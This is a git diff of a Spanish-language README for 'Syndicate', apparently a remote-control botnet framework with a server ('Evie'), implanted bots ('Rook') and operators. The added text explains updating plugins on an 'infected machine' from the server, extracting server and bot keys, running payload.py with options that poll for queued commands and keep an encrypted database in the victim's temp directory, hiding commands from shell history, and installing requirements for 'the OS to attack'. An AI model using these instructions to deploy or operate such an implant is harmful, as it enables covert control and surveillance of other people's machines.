@@ -13,6 +13,8 @@ Tratare de englobar todas las caracteristicas posibles de Syndicate, espero no m
 * Comunicación por servidores o lo que quiere decir, que creando una red entre Evie's puedes hacer pasar cada paquete a una dirección o podría decirse nodos intermedios hasta llegar a un punto final o nodo final. La red está diseñada para que no se pueda saber que dirección envío qué y dónde, exceptuando algunas cosas, pero que ya explicaré después y además se tiene que configurar toda la red manualmente; Eso brinda más seguridad.
 * Uso de proxy's para mayor privacidad.
 * Sistema antí fuerza bruta: Esto es relativo. Relativo según las configuraciones que ejerce el administrador y el mismo usuario. porque el administrdor decide cómo **Evie**, va a bloquear a un usuario, cuándo y porqué. Dejaré la explicación más adelante.
+* Los complementos se pueden actualizar de forma transparente o lo que quiere decir, que sí tenemos una máquina infectada podremos cambiar el código desde el servidor y ejecutarlo en la máquina correspondiente.
+* Además del cifrado que viene incorporado, podemos agregarle una capa más con https
 
 ### Tipos de configuración
 
@@ -210,7 +212,67 @@ No explicaré todo, porque hay cosas que son sencillas y otras ya las explique, 
 
 Lo negativo de usar una ruta aleatoria es que si el servidor se "apaga" y se inicia nuevamente, tendrá otra ruta, lo que quiere decir que los **Jacob's** tendran que saberlo; es recomendable sólo cuando hay pocos **Jacob's**.
 
-**Nota**: Puede usar el parámetro "**-h, --help**" para ver la ayuda en la mayoría de herramientas.
+Ahora para que **Evie** tenga algún sentido en la vida, que tal si ejecutamos la [Carga util](payload.py), pero antes quiero aclarar algo que tiene que ver con los complementos, aunque aún no me adentrare en aguas turbulentas por ahora estamos en la orilla del mar (**Eso es en otra sección**). Prosigamos:
+
+Tenemos que tener en cuenta que los complementos necesitan requerimientos, cosa que mencionaré en la instalación, aunqué podemos edítar [El archivo de configuración del payload](payload_conf/modules.py) y remover o agregar lo que necesitemos.
+
+Bien, una vez aclarado, necesitamos la **Clave Pública de Evie** y la **Clave Privada del Rook**; La obtenemos de la siguiente forma:
+
+```bash
+./show_server_keys.py $params | more
+...
+Clave Pública:
+...
+Clave Privada:
+...
+```
+
+Usamos "**more**" para delimitar la salida y ver lo que necesitamos, la clave pública. La seleccionamos, copiamos y la guardamos en una ruta segura, cómo "**/tmp**":
+
+```bash
+nano /tmp/<Nombre de la clave pública> # Una vez abierto "nano" pegamos la clave pública y la guardamos
+...
+```
+
+Hacemos el mismo procedimiento, pero esta vez será para la **Clave Privada del Rook**:
+
+```bash
+ ./addbot.py -show -option keys -P <identificador del rook>:<Frase de contraseña para desencriptarla> $params
+```
+*Cómo ven, deje un espacio para que no se guardara el comando en el historial*
+
+Esta vez vemos nuevos parámetros con argumentos interesantes:
+
+* **-show**: Mostramos los usuarios disponibles.
+* **-option**: Usamos una clave especifica para ver algo especifico de la información del usuario. Podemos usar el parámetro "**-h, --help**" para ver la ayuda dónde también nos mostrara las claves que acepta.
+* **-P**: La frase de contraseña de la clave privada.
+
+Buscamos el rook y la clave privada desencriptada, hacemos el mismo procedimiento que hicimos con la clave pública de Evie
+
+```bash
+nano /tmp/<Nombre de la clave privada> # Una vez abierto "nano" pegamos la clave privada y la guardamos
+...
+```
+
+Ahora sí, ejecutemos el [Payload](payload.py)
+
+```bash
+./payload.py -b <Identificador del Rook> -pass <Frase de contraseña del Rook> -a <Dirección de Evie> -p <Puerto> -P <Ruta de la dirección URL> -pub-key <Clave pública de Evie> -priv-key <Clave privada del Rook> -proto <Protocolo, puede ser http o https> -sleep-check <Intervalos en que se hace una petición para ver si hay comandos en cola> -db-path <El nombre de la base de datos> -db-pass <Frase de contraseña de la base de datos>
+```
+
+Explico poco a poco lo que siento que pueden tener dudas:
+
+* **-sleep-check**: Rook hace una petición a el/los servidor/es para verificar si algún **Jacob** propuso un comando en cola
+* **-db-path**: Los rook's tienen bases de datos que se almacenan en el directorio temporal del sistema operativo (**encriptada**, por supuesto)
+* **-db-pass**: La frase de contraseña para cifrar la base de datos
+
+**Nota**: Puede usar el parámetro "**-no-verbose**" para que no imprima el resultado de alguna operación
+
+*Esto es una prueba, por lo que todo se hará por la consola, ya hablare sobre como usar la programación a nuestro favor.*
+
+Ejecutamos: [control.py](control.py) para interactuar con el **Rook** de forma interactiva
+
+**Nota**: Puede usar el parámetro "**-h, --help**" en la mayoria de herramientas para ver la ayuda.
 
 ## Complementos
 
@@ -220,7 +282,18 @@ Lo negativo de usar una ruta aleatoria es que si el servidor se "apaga" y se ini
 * Recomiendo que si usted va a probar Syndicate en Windows, use Cygwin o WSL, aunque no le garantizó nada.
 * En Android tecnicamente debería funcionar con Userland, aunque tmux no es mala elección.
 
-## Requerimientos
+## Instalación
+
+Primero clonamos el repositorio:
+
+```bash
+git clone https://github.com/DtxdF/Syndicate
+cd Syndicate
+```
+
+Y luego instalamos los...
+
+### Requerimientos
 
 Puede optar por una fácil instalación con PIP, pero hay algunos inconvenientes que dependen de usted.
 
@@ -269,13 +342,6 @@ sudo pip install PyAudio==0.2.11
 ```
 
 Usted se estará preguntado: *¿Windows?, ya mencionaste que sólo funciona en **Linux***, Claro, estos requerimientos son para los complementos dependiendo del SO a atacar.
-
-## Instalación
-
-```
-git clone https://github.com/DtxdF/Syndicate
-cd Syndicate
-```
 
 ## Limitaciones
 
